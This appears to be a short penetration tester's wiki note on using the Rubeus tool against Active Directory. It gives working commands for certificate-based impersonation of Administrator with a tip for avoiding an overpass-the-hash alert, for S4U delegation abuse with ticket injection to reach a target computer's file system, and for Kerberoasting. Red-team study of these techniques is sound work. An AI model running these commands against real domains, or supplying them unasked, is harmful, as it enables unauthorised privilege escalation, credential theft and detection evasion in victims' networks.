# Rubeus

Rubeus is Active Directory exploitation tool that is prodominately used from compromised domain-joined Windows host, so gain access and compile [Rubeus](https://github.com/GhostPack/Rubeus) on the target machine. Compilation instructions can be found [here](https://github.com/GhostPack/Rubeus#compile-instructions)

Impersonate a User for [[AD-Certificate-Exploitation]], use Rubeus to request a TGT using the certificate to verify that the certificate is trusted - [[AD-Certificate-Exploitation]] and [[AD-Persistence-Certificates]]
```powershell
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:$generated-cert /password:$cert-password /outfile:$output.pfx /domain:$domain /dc:$dc-ip
# /user has to match the UPN for the certificate
# set /enctype to avoid overpass-the-hash alert
# /dc: set to DC that has CA service running!
```


In [[GenericAll]] abuse; we can then use hash the plaintext password into its RC4_HMAC form:

```powershell
Rubeus.exe hash /password:Summer2018!
```

And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:

```powershell
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
```


Kerberoast
```powershell
.\Rubeus.exe kerberoast /creduser:$domain.$tld\$user /credpassword:Password123! /nowrap
```